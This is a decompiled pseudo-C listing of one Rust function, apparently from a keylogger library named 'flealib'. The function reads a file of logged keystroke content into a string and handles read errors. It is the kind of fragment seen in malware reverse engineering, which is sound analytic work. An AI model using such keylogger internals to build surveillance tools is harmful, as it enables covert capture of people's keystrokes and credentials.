
  int128_t* flealib::keylogger::get_key_logger_content::h78384b0237ee3f63(int128_t* arg1, void* arg2)

{
    int64_t var_20;
    int64_t rdx = std::fs::read_to_string::h9e8e764235d1f42f(&var_20, arg2);
    
    if (!(0 + -(var_20)))
    {
        int64_t var_10;
        arg1[1] = var_10;
        *arg1 = var_20;
        return arg1;
    }
    
    int64_t var_18;
    int64_t var_28 = var_18;
    _$LT$T$u20$as$u20$alloc..string..SpecToString$GT$::spec_to_string::h00281d94234d25d8(arg1, 
        &var_28, rdx);
    core::ptr::drop_in_place$LT$std..io..error..Error$GT$::h96b79424257da29d(&var_28);
    return arg1;
}
